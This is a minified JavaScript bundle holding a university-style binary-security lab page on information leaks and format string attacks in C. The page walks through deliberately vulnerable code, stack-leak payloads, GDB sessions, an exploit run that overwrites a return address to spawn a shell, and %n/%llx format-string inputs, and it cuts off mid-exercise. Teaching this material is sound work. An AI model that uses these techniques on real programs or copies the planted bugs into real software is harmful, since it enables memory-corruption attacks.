"use strict";(self.webpackChunkbinary_security=self.webpackChunkbinary_security||[]).push([[3103],{5680:(e,n,a)=>{a.d(n,{xA:()=>g,yg:()=>f});var t=a(6540);function i(e,n,a){return n in e?Object.defineProperty(e,n,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[n]=a,e}function r(e,n){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);n&&(t=t.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),a.push.apply(a,t)}return a}function o(e){for(var n=1;n<arguments.length;n++){var a=null!=arguments[n]?arguments[n]:{};n%2?r(Object(a),!0).forEach((function(n){i(e,n,a[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):r(Object(a)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(a,n))}))}return e}function l(e,n){if(null==e)return{};var a,t,i=function(e,n){if(null==e)return{};var a,t,i={},r=Object.keys(e);for(t=0;t<r.length;t++)a=r[t],n.indexOf(a)>=0||(i[a]=e[a]);return i}(e,n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(t=0;t<r.length;t++)a=r[t],n.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(i[a]=e[a])}return i}var s=t.createContext({}),p=function(e){var n=t.useContext(s),a=n;return e&&(a="function"==typeof e?e(n):o(o({},n),e)),a},g=function(e){var n=p(e.components);return t.createElement(s.Provider,{value:n},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return t.createElement(t.Fragment,{},n)}},m=t.forwardRef((function(e,n){var a=e.components,i=e.mdxType,r=e.originalType,s=e.parentName,g=l(e,["components","mdxType","originalType","parentName"]),c=p(a),m=i,f=c["".concat(s,".").concat(m)]||c[m]||d[m]||r;return a?t.createElement(f,o(o({ref:n},g),{},{components:a})):t.createElement(f,o({ref:n},g))}));function f(e,n){var a=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var r=a.length,o=new Array(r);o[0]=m;var l={};for(var s in n)hasOwnProperty.call(n,s)&&(l[s]=n[s]);l.originalType=e,l[c]="string"==typeof e?e:i,o[1]=l;for(var p=2;p<r;p++)o[p]=a[p];return t.createElement.apply(null,o)}return t.createElement.apply(null,a)}m.displayName="MDXCreateElement"},4925:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>s,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>l,toc:()=>p});var t=a(8168),i=(a(6540),a(5680));const r={},o="Information Leaks",l={unversionedId:"Mitigation and Defensive Strategies/Information Leaks/Reading/README",id:"Mitigation and Defensive Strategies/Information Leaks/Reading/README",title:"Information Leaks",description:"Introduction",source:"@site/docs/Mitigation and Defensive Strategies/Information Leaks/Reading/README.md",sourceDirName:"Mitigation and Defensive Strategies/Information Leaks/Reading",slug:"/Mitigation and Defensive Strategies/Information Leaks/Reading/",permalink:"/binary-security/Mitigation and Defensive Strategies/Information Leaks/Reading/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"sidebar",previous:{title:"Information Leaks",permalink:"/binary-security/Mitigation and Defensive Strategies/Information Leaks/"},next:{title:"Bypassing Mitigations",permalink:"/binary-security/Mitigation and Defensive Strategies/Bypassing Mitigations/"}},s={},p=[{value:"Introduction",id:"introduction",level:2},{value:"Objectives &amp; Rationale",id:"objectives--rationale",level:3},{value:"What is a String?",id:"what-is-a-string",level:3},{value:"Length Management",id:"length-management",level:3},{value:"1. Basic Info Leak (tutorial)",id:"1-basic-info-leak-tutorial",level:2},{value:"2. Information Leak",id:"2-information-leak",level:2},{value:"Exploiting the Memory Write Using the Info Leak",id:"exploiting-the-memory-write-using-the-info-leak",level:3},{value:"Format String Attacks",id:"format-string-attacks",level:3},{value:"Example 2",id:"example-2",level:2},{value:"Example 3",id:"example-3",level:2},{value:"Basic Format String Attack",id:"basic-format-string-attack",level:2},{value:"Extra: Format String Attack",id:"extra-format-string-attack",level:2},{value:"Transform Format String Attack to a Memory Write",id:"transform-format-string-attack-to-a-memory-write",level:3},{value:"Mitigation and Recommendations",id:"mitigation-and-recommendations",level:3},{value:"Real life Examples",id:"real-life-examples",level:3},{value:"Resources",id:"resources",level:2}],g={toc:p},c="wrapper";function d(e){let{components:n,...a}=e;return(0,i.yg)(c,(0,t.A)({},g,a,{components:n,mdxType:"MDXLayout"}),(0,i.yg)("h1",{id:"information-leaks"},"Information Leaks"),(0,i.yg)("h2",{id:"introduction"},"Introduction"),(0,i.yg)("h3",{id:"objectives--rationale"},"Objectives & Rationale"),(0,i.yg)("p",null,"This is a tutorial based lab.\nThroughout this lab you will learn about frequent errors that occur when handling strings.\nThis tutorial is focused on the C language.\nGenerally, object-oriented programming languages (like Java, C#,C++) are using classes to represent strings -- this simplifies the way strings are handled and decreases the frequency of programming errors."),(0,i.yg)("h3",{id:"what-is-a-string"},"What is a String?"),(0,i.yg)("p",null,"Conceptually, a string is sequence of characters.\nThe representation of a string can be done in multiple ways.\nOne of the way is to represent a string as a contiguous memory buffer.\nEach character is ",(0,i.yg)("strong",{parentName:"p"},"encoded")," in a way.\nFor example the ",(0,i.yg)("strong",{parentName:"p"},"ASCII")," encoding uses 7-bit integers to encode each character -- because it is more convenient to store 8-bits at a time in a byte, an ASCII character is stored in one byte."),(0,i.yg)("p",null,"The type for representing an ASCII character in C is ",(0,i.yg)("inlineCode",{parentName:"p"},"char")," and it uses one byte.\nAs a side note, ",(0,i.yg)("inlineCode",{parentName:"p"},"sizeof(char) == 1")," is the only guarantee that the ",(0,i.yg)("a",{parentName:"p",href:"http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf",title:"http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf"},"C standard")," gives."),(0,i.yg)("p",null,"Another encoding that can be used is Unicode (with UTF8, UTF16, UTF32 etc.  as mappings).\nThe idea is that in order to represent an Unicode string, ",(0,i.yg)("strong",{parentName:"p"},"more than one")," byte is needed for ",(0,i.yg)("strong",{parentName:"p"},"one")," character.\n",(0,i.yg)("inlineCode",{parentName:"p"},"char16_t"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"char32_t")," were introduced in the C standard to represent these strings.\nThe C language also has another type, called ",(0,i.yg)("inlineCode",{parentName:"p"},"wchar_t"),", which is implementation defined and should not be used to represent Unicode characters."),(0,i.yg)("p",null,"Our tutorial will focus on ASCII strings, where each character is represented in one byte.\nWe will show a few examples of what happens when one calls ",(0,i.yg)("em",{parentName:"p"},"string manipulation functions")," that are assuming a specific encoding of the string."),(0,i.yg)("p",null,"You will find extensive information on ASCII in the ",(0,i.yg)("a",{parentName:"p",href:"http://man7.org/linux/man-pages/man7/ascii.7.html",title:"http://man7.org/linux/man-pages/man7/ascii.7.html"},"ascii man page"),"."),(0,i.yg)("p",null,"Inside an Unix terminal issue the command"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"man ascii\n")),(0,i.yg)("h3",{id:"length-management"},"Length Management"),(0,i.yg)("p",null,"In C, the length of an ASCII string is given by its contents.\nAn ASCII string ends with a ",(0,i.yg)("inlineCode",{parentName:"p"},"0")," value byte called the ",(0,i.yg)("inlineCode",{parentName:"p"},"NUL")," byte.\nEvery ",(0,i.yg)("inlineCode",{parentName:"p"},"str*")," function (i.e. a function with the name starting with ",(0,i.yg)("inlineCode",{parentName:"p"},"str"),", such as ",(0,i.yg)("inlineCode",{parentName:"p"},"strcpy"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"strcat"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"strdup"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"strstr")," etc.) uses this ",(0,i.yg)("inlineCode",{parentName:"p"},"0")," byte to detect where the string ends.\nAs a result, not ending strings in ",(0,i.yg)("inlineCode",{parentName:"p"},"0")," and using ",(0,i.yg)("inlineCode",{parentName:"p"},"str*")," functions leads to vulnerabilities."),(0,i.yg)("h2",{id:"1-basic-info-leak-tutorial"},"1. Basic Info Leak (tutorial)"),(0,i.yg)("p",null,"Enter the ",(0,i.yg)("inlineCode",{parentName:"p"},"01-basic-info-leak/")," subfolder.\nIt's a basic information leak example."),(0,i.yg)("p",null,"In ",(0,i.yg)("inlineCode",{parentName:"p"},"basic_info_leak.c"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"buf")," is supplied as input, hence is not trusted.\nWe should be careful with this buffer.\nIf the user gives ",(0,i.yg)("inlineCode",{parentName:"p"},"32")," bytes as input then ",(0,i.yg)("inlineCode",{parentName:"p"},"strcpy")," will copy bytes in ",(0,i.yg)("inlineCode",{parentName:"p"},"my_string")," until it finds a ",(0,i.yg)("inlineCode",{parentName:"p"},"NUL")," byte (",(0,i.yg)("inlineCode",{parentName:"p"},"0x00"),").\nBecause the ",(0,i.yg)("a",{parentName:"p",href:"/courses/cns/labs/lab-05",title:"cns:labs:lab-05"},"stack grows down"),", on most platforms, we will start accessing the content of the stack.\nAfter the ",(0,i.yg)("inlineCode",{parentName:"p"},"buf")," variable the stack stores the ",(0,i.yg)("inlineCode",{parentName:"p"},"old rbp"),", the function return address and then the function parameters.\nThis information is copied into ",(0,i.yg)("inlineCode",{parentName:"p"},"my_string"),".\nAs such, printing information in ",(0,i.yg)("inlineCode",{parentName:"p"},"my_string")," (after byte index ",(0,i.yg)("inlineCode",{parentName:"p"},"32"),") using ",(0,i.yg)("inlineCode",{parentName:"p"},"puts()")," results in information leaks."),(0,i.yg)("p",null,"We can test this using:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ python -c 'print(\"A\"*32)' | ./basic_info_leak\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd8\ufffd\n")),(0,i.yg)("p",null,"In order to check the hexadecimal values of the leak, we pipe the output\nthrough ",(0,i.yg)("inlineCode",{parentName:"p"},"xxd"),":"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ python -c 'print(\"A\"*32)' | ./basic_info_leak | xxd\n00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA\n00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA\n00000020: d066 57b4 fc7f 0a                        .fW....\n")),(0,i.yg)("p",null,"We have leaked one value above:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},"the lower non-0 bytes of the old/stored ",(0,i.yg)("inlineCode",{parentName:"li"},"rbp")," value (right after the buffer)"),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"0x7ffcb45766d0")," (it's a little endian architecture);\nit will differ on your system")),(0,i.yg)("p",null,"The return address usually doesn't change (except for executables with PIE, ",(0,i.yg)("em",{parentName:"p"},"Position Independent Executable")," support).\nBut assuming ASLR is enabled, the ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp")," value changes at each run.\nIf we leak it we have a basic address that we can toy around to leak or overwrite other values."),(0,i.yg)("h2",{id:"2-information-leak"},"2. Information Leak"),(0,i.yg)("p",null,"We will now show how improper string handling will lead to information leaks from the memory.\nFor this, please access the ",(0,i.yg)("inlineCode",{parentName:"p"},"02-info-leak/")," subfolder.\nPlease browse the ",(0,i.yg)("inlineCode",{parentName:"p"},"info-leak.c")," source code file."),(0,i.yg)("p",null,"The snippet below is the relevant code snippet.\nThe goal is to call the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_evil_func()")," function.\nOne of the building blocks of exploiting a vulnerability is to see whether or not we have memory write.\nIf you have memory writes, then getting code execution is a matter of getting things right.\nIn this task we are assuming that we have memory write (i.e. we can write any value at any address).\nYou can call the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_evil_func()")," function by overriding the return address of the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_main()")," function:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-c"},'#define NAME_SZ 32\n\xa0\nstatic void read_name(char *name)\n{\n    memset(name, 0, NAME_SZ);\n    read(0, name, NAME_SZ);\n    //name[NAME_SZ-1] = 0;\n}\n\xa0\nstatic void my_main(void)\n{\n    char name[NAME_SZ];\n\xa0\n    read_name(name);\n    printf("hello %s, what address to modify and with what value?\\n", name);\n    fflush(stdout);\n    my_memory_write();\n    printf("Returning from main!\\n");\n}\n')),(0,i.yg)("p",null,"What catches our eye is that the ",(0,i.yg)("inlineCode",{parentName:"p"},"read()")," function call in the ",(0,i.yg)("inlineCode",{parentName:"p"},"read_name()")," function read ",(0,i.yg)("strong",{parentName:"p"},"exactly")," ",(0,i.yg)("inlineCode",{parentName:"p"},"32")," bytes.\nIf we provide it ",(0,i.yg)("inlineCode",{parentName:"p"},"32")," bytes it won't be null-terminated and will result in an information leak when ",(0,i.yg)("inlineCode",{parentName:"p"},"printf()")," is called in the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_main()")," function."),(0,i.yg)("h3",{id:"exploiting-the-memory-write-using-the-info-leak"},"Exploiting the Memory Write Using the Info Leak"),(0,i.yg)("p",null,"Let's first try to see how the program works:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ python -c 'import sys; sys.stdout.write(10*\"A\")' | ./info_leak\nhello AAAAAAAAAA, what address to modify and with what value?\n")),(0,i.yg)("p",null,"The binary wants an input from the user using the ",(0,i.yg)("inlineCode",{parentName:"p"},"read()")," library call as we can see below:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'$ python -c \'import sys; sys.stdout.write(10*"A")\' | strace -e read ./info_leak\nread(3, "\\177ELF\\1\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\360\\203\\1\\0004\\0\\0\\0"..., 512) = 512\nread(0, "AAAAAAAAAA", 32)               = 10\nhello AAAAAAAAAA, what address to modify and with what value?\nread(0, "", 4)                          = 0\n+++ exited with 255 +++\n')),(0,i.yg)("p",null,"The input is read using the ",(0,i.yg)("inlineCode",{parentName:"p"},"read()")," system call.\nThe first read expects 32 bytes.\nYou can see already that there's another ",(0,i.yg)("inlineCode",{parentName:"p"},"read()")," call.\nThat one is the first ",(0,i.yg)("inlineCode",{parentName:"p"},"read()")," call in the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_memory_write()")," function."),(0,i.yg)("p",null,"As noted above, if we use exactly ",(0,i.yg)("inlineCode",{parentName:"p"},"32")," bytes for name we will end up with a non-null-terminated string, leading to an information leak.\nLet's see how that goes:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ python -c 'import sys; sys.stdout.write(32*\"A\")' | ./info_leak\nhello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd)\ufffd\ufffd\ufffd, what address to modify and with what value?\n\xa0\n$ python -c 'import sys; sys.stdout.write(32*\"A\")' | ./info_leak | xxd\n00000000: 6865 6c6c 6f20 4141 4141 4141 4141 4141  hello AAAAAAAAAA\n00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA\n00000020: 4141 4141 4141 f0dc ffff ff7f 2c20 7768  AAAAAA......, wh\n00000030: 6174 2061 6464 7265 7373 2074 6f20 6d6f  at address to mo\n00000040: 6469 6679 2061 6e64 2077 6974 6820 7768  dify and with wh\n00000050: 6174 2076 616c 7565 3f0a                 at value?.\n")),(0,i.yg)("p",null,"We see we have an information leak.\nWe leak one piece of data above: ",(0,i.yg)("inlineCode",{parentName:"p"},"0x7fffffffdcf0"),".\nIf we run multiple times we can see that the values for the first piece of information differs:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ python -c 'import sys; sys.stdout.write(32*\"A\")' | ./info_leak | xxd | grep ','\n00000020: 4141 4141 4141 f0dc ffff ff7f 2c20 7768  AAAAAA......, wh\n")),(0,i.yg)("p",null,"The variable part is related to a stack address (it starts with ",(0,i.yg)("inlineCode",{parentName:"p"},"0x7f"),");\nit varies because ASLR is enabled.\nWe want to look more carefully using GDB and figure out what the variable value represents:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ gdb -q ./info_leak\nReading symbols from ./info_leak...done.\ngdb-peda$ b my_main\nBreakpoint 1 at 0x400560\ngdb-peda$ r < <(python -c 'import sys; sys.stdout.write(32*\"A\")')\nStarting program: info_leak < <(python -c 'import sys; sys.stdout.write(32*\"A\")')\n[...]\n\xa0\n# Do next instructions until after the call to `printf()`.\ngdb-peda$ ni\n....\n\xa0\ngdb-peda$ x/12g name\n0x7fffffffdc20: 0x4141414141414141  0x4141414141414141\n0x7fffffffdc30: 0x4141414141414141  0x4141414141414141\n0x7fffffffdc40: 0x00007fffffffdc50  0x00000000004007aa\ngdb-peda$ x/2i 0x004007aa\n   0x4007aa <main+9>:  mov    edi,0x4008bc\n   0x4007af <main+14>: call   0x400550 <puts@plt>\ngdb-peda$ pdis main\nDump of assembler code for function main:\n   0x00000000004007a1 <+0>:    push   rbp\n   0x00000000004007a2 <+1>:    mov    rbp,rsp\n   0x00000000004007a5 <+4>:    call   0x400756 <my_main>\n   0x00000000004007aa <+9>:    mov    edi,0x4008bc\n   0x00000000004007af <+14>:   call   0x400550 <puts@plt>\n   0x00000000004007b4 <+19>:   mov    eax,0x0\n   0x00000000004007b9 <+24>:   pop    rbp\n   0x00000000004007ba <+25>:   ret\nEnd of assembler dump.\ngdb-peda$\n")),(0,i.yg)("p",null,"From the GDB above, we determine that, after our buffer, there is the stored ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp")," (i.e. old ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp"),")."),(0,i.yg)("p",null,"In 32-bit program there would (usually) be 2 leaked values:"),(0,i.yg)("ol",null,(0,i.yg)("li",{parentName:"ol"},"The old ",(0,i.yg)("inlineCode",{parentName:"li"},"ebp")),(0,i.yg)("li",{parentName:"ol"},"The return address of the function")),(0,i.yg)("p",null,"This happens if the values of the old ",(0,i.yg)("inlineCode",{parentName:"p"},"ebp")," and the return address don't have any ",(0,i.yg)("inlineCode",{parentName:"p"},"x00")," bytes."),(0,i.yg)("p",null,"In the 64-bit example we only get the old ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp")," because the 2 high bytes of the stack address are always ",(0,i.yg)("inlineCode",{parentName:"p"},"0")," which causes the string to be terminated early."),(0,i.yg)("p",null,"When we leak the two values we are able to retrieve the stored ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp")," value.\nIn the above run the value of ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp")," is ",(0,i.yg)("inlineCode",{parentName:"p"},"0x00007fffffffdc50"),".\nWe also see that the stored ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp")," value is stored at ",(0,i.yg)("strong",{parentName:"p"},"address")," ",(0,i.yg)("inlineCode",{parentName:"p"},"0x7fffffffdc40"),", which is the address current ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp"),".\nWe have the situation in the below diagram:"),(0,i.yg)("p",null,(0,i.yg)("img",{parentName:"p",src:"https://ocw.cs.pub.ro/courses/_media/cns/labs/info-leak-stack-64.png",alt:"Stak Information Leak"})),(0,i.yg)("p",null,"We marked the stored ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp")," value (i.e. the frame pointer for ",(0,i.yg)("inlineCode",{parentName:"p"},"main()"),": ",(0,i.yg)("inlineCode",{parentName:"p"},"0x7fffffffdc50"),") with the font color red in both places."),(0,i.yg)("p",null,"In short, if we leak the value of the stored ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp")," (i.e. the frame pointer for ",(0,i.yg)("inlineCode",{parentName:"p"},"main()"),": ",(0,i.yg)("inlineCode",{parentName:"p"},"0x00007fffffffdc50"),") we can determine the address of the current ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp")," (i.e. the frame pointer for ",(0,i.yg)("inlineCode",{parentName:"p"},"my_main()"),": ",(0,i.yg)("inlineCode",{parentName:"p"},"0x7fffffffdc40"),"), by subtracting ",(0,i.yg)("inlineCode",{parentName:"p"},"16"),".\nThe address where the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_main()")," return address is stored (",(0,i.yg)("inlineCode",{parentName:"p"},"0x7fffffffdc48"),") is computed by subtracting ",(0,i.yg)("inlineCode",{parentName:"p"},"8")," from the leaked ",(0,i.yg)("inlineCode",{parentName:"p"},"rbp")," value.\nBy overwriting the value at this address we will force an arbitrary code execution and call ",(0,i.yg)("inlineCode",{parentName:"p"},"my_evil_func()"),"."),(0,i.yg)("p",null,"In order to write the return address of the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_main()")," function with the address of the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_evil_func()")," function, make use of the conveniently (but not realistically) placed ",(0,i.yg)("inlineCode",{parentName:"p"},"my_memory_write()")," function.\nThe ",(0,i.yg)("inlineCode",{parentName:"p"},"my_memory_write()")," allows the user to write arbitrary values to arbitrary memory addresses."),(0,i.yg)("p",null,"Considering all of this, update the ",(0,i.yg)("inlineCode",{parentName:"p"},"TODO")," lines of the ",(0,i.yg)("inlineCode",{parentName:"p"},"exploit.py")," script to make it call the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_evil_func()")," function."),(0,i.yg)("p",null,"Same as above, use ",(0,i.yg)("inlineCode",{parentName:"p"},"nm")," to determine address of the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_evil_func()")," function.\nWhen sending your exploit to the remote server, adjust this address according to the binary running on the remote endpoint.\nThe precompiled binary can be found in ",(0,i.yg)("a",{parentName:"p",href:"/courses/cns/resources/repo",title:"cns:resources:repo"},"the CNS public repository"),"."),(0,i.yg)("p",null,"Use the above logic to determine the ",(0,i.yg)("inlineCode",{parentName:"p"},"old rbp")," leak and then the address of the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_main()")," return address."),(0,i.yg)("p",null,"See ",(0,i.yg)("a",{parentName:"p",href:"https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.unpack",title:"https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.unpack"},"here")," examples of using the ",(0,i.yg)("inlineCode",{parentName:"p"},"unpack()")," function."),(0,i.yg)("p",null,"In case of a successful exploit the program will spawn a shell in the ",(0,i.yg)("inlineCode",{parentName:"p"},"my_evil_func()")," function, same as below:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ python exploit.py\n[!] Could not find executable 'info_leak' in $PATH, using './info_leak' instead\n[+] Starting local process './info_leak': pid 6422\n[*] old_rbp is 0x7fffffffdd40\n[*] return address is located at is 0x7fffffffdd38\n[*] Switching to interactive mode\nReturning from main!\n$ id\nuid=1000(ctf) gid=1000(ctf) groups=1000(ctf)\n")),(0,i.yg)("p",null,"The rule of thumb is: ",(0,i.yg)("strong",{parentName:"p"},"Always know your string length.")),(0,i.yg)("h3",{id:"format-string-attacks"},"Format String Attacks"),(0,i.yg)("p",null,"We will now see how improper use of ",(0,i.yg)("inlineCode",{parentName:"p"},"printf()")," may provide us with ways of extracting information or doing actual attacks."),(0,i.yg)("p",null,"Calling ",(0,i.yg)("inlineCode",{parentName:"p"},"printf")," or some other string function that takes a format string as a parameter, directly with a string which is supplied by the user leads to a vulnerability called ",(0,i.yg)("strong",{parentName:"p"},"format string attack"),"."),(0,i.yg)("p",null,"The definition of ",(0,i.yg)("inlineCode",{parentName:"p"},"printf"),":"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-c"},"int printf(const char *format, ...);\n")),(0,i.yg)("p",null,"Let's recap some of ",(0,i.yg)("a",{parentName:"p",href:"http://www.cplusplus.com/reference/cstdio/printf/"},"useful formats"),":"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"%08x")," -- prints a number in hex format, meaning takes a number from the stack and prints in hex format"),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"%s")," -- prints a string, meaning takes a pointer from the stack and prints the string from that address"),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"%n")," -- writes the number of bytes written so far to the address given as a parameter to the function (takes a pointer from the stack).\nThis format is not widely used but it is in the C standard."),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("inlineCode",{parentName:"li"},"%x")," and ",(0,i.yg)("inlineCode",{parentName:"li"},"%n")," are enough to have memory read and write and hence, to successfully exploit a vulnerable program that calls ",(0,i.yg)("inlineCode",{parentName:"li"},"printf")," (or other format string function) directly with a string controlled by the user.")),(0,i.yg)("h2",{id:"example-2"},"Example 2"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-c"},"printf(my_string);\n")),(0,i.yg)("p",null,"The above snippet is a good example of why ignoring compile time warnings is dangerous.\nThe given example is easily detected by a static checker."),(0,i.yg)("p",null,"Try to think about:"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},"The peculiarities of ",(0,i.yg)("inlineCode",{parentName:"li"},"printf")," (variable number of arguments)"),(0,i.yg)("li",{parentName:"ul"},"Where ",(0,i.yg)("inlineCode",{parentName:"li"},"printf")," stores its arguments (",(0,i.yg)("em",{parentName:"li"},"hint"),": on the stack)"),(0,i.yg)("li",{parentName:"ul"},"What happens when ",(0,i.yg)("inlineCode",{parentName:"li"},"my_string")," is ",(0,i.yg)("inlineCode",{parentName:"li"},'"%x"')),(0,i.yg)("li",{parentName:"ul"},"How matching between format strings (e.g. the one above) and arguments is enforced (",(0,i.yg)("em",{parentName:"li"},"hint"),": it's not) and what happens in general when the number of arguments doesn't match the number of format specifiers"),(0,i.yg)("li",{parentName:"ul"},"How we could use this to cause information leaks and arbitrary memory writes (",(0,i.yg)("em",{parentName:"li"},"hint"),": see the format specifiers at the beginning of the section)")),(0,i.yg)("h2",{id:"example-3"},"Example 3"),(0,i.yg)("p",null,"We would like to check some of the well known and not so-well known features of ",(0,i.yg)("a",{parentName:"p",href:"http://man7.org/linux/man-pages/man3/printf.3.html"},"the ",(0,i.yg)("inlineCode",{parentName:"a"},"printf")," function"),".\nSome of them may be used for information leaking and for attacks such as format string attacks."),(0,i.yg)("p",null,"Go into ",(0,i.yg)("inlineCode",{parentName:"p"},"printf-features/")," subfolder and browse the ",(0,i.yg)("inlineCode",{parentName:"p"},"printf-features.c")," file.\nCompile the executable file using:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"make\n")),(0,i.yg)("p",null,"and then run the resulting executable file using"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"./printf-features\n")),(0,i.yg)("p",null,"Go through the ",(0,i.yg)("inlineCode",{parentName:"p"},"printf-features.c")," file again and check how print, length and conversion specifiers are used by ",(0,i.yg)("inlineCode",{parentName:"p"},"printf"),".\nWe will make use of the ",(0,i.yg)("inlineCode",{parentName:"p"},"%n")," feature that allows memory writes, a requirement for attacks."),(0,i.yg)("h2",{id:"basic-format-string-attack"},"Basic Format String Attack"),(0,i.yg)("p",null,"You will now do a basic format string attack using the ",(0,i.yg)("inlineCode",{parentName:"p"},"03-basic-format-string/")," subfolder.\nThe source code is in ",(0,i.yg)("inlineCode",{parentName:"p"},"basic_format_string.c")," and the executable is in ",(0,i.yg)("inlineCode",{parentName:"p"},"basic_format_string"),"."),(0,i.yg)("p",null,"You need to use ",(0,i.yg)("inlineCode",{parentName:"p"},"%n")," to overwrite the value of the ",(0,i.yg)("inlineCode",{parentName:"p"},"v")," variable to ",(0,i.yg)("inlineCode",{parentName:"p"},"0x300"),".\nYou have to do three steps:"),(0,i.yg)("ol",null,(0,i.yg)("li",{parentName:"ol"},(0,i.yg)("p",{parentName:"li"},"Determine the address of the ",(0,i.yg)("inlineCode",{parentName:"p"},"v")," variable using ",(0,i.yg)("inlineCode",{parentName:"p"},"nm"),".")),(0,i.yg)("li",{parentName:"ol"},(0,i.yg)("p",{parentName:"li"},"Determine the ",(0,i.yg)("inlineCode",{parentName:"p"},"n"),"-th parameter of ",(0,i.yg)("inlineCode",{parentName:"p"},"printf()")," that you can write to using ",(0,i.yg)("inlineCode",{parentName:"p"},"%n"),".\nThe ",(0,i.yg)("inlineCode",{parentName:"p"},"buffer")," variable will have to be that parameter;\nyou will store the address of the ",(0,i.yg)("inlineCode",{parentName:"p"},"v")," variable in the ",(0,i.yg)("inlineCode",{parentName:"p"},"buffer")," variable.")),(0,i.yg)("li",{parentName:"ol"},(0,i.yg)("p",{parentName:"li"},"Construct a format string that enables the attack;\nthe number of characters processed by ",(0,i.yg)("inlineCode",{parentName:"p"},"printf()")," until ",(0,i.yg)("inlineCode",{parentName:"p"},"%n")," is matched will have to be ",(0,i.yg)("inlineCode",{parentName:"p"},"0x300"),"."))),(0,i.yg)("p",null,"For the second step let's run the program multiple times and figure out where the ",(0,i.yg)("inlineCode",{parentName:"p"},"buffer")," address starts.\nWe fill ",(0,i.yg)("inlineCode",{parentName:"p"},"buffer")," with the ",(0,i.yg)("inlineCode",{parentName:"p"},"aaaa")," string and we expect to discover it using the ",(0,i.yg)("inlineCode",{parentName:"p"},"printf()")," format specifiers."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$  ./basic_format_string\nAAAAAAAA\n%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx\n7fffffffdcc07fffffffdcc01f6022897ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25\n\n$ 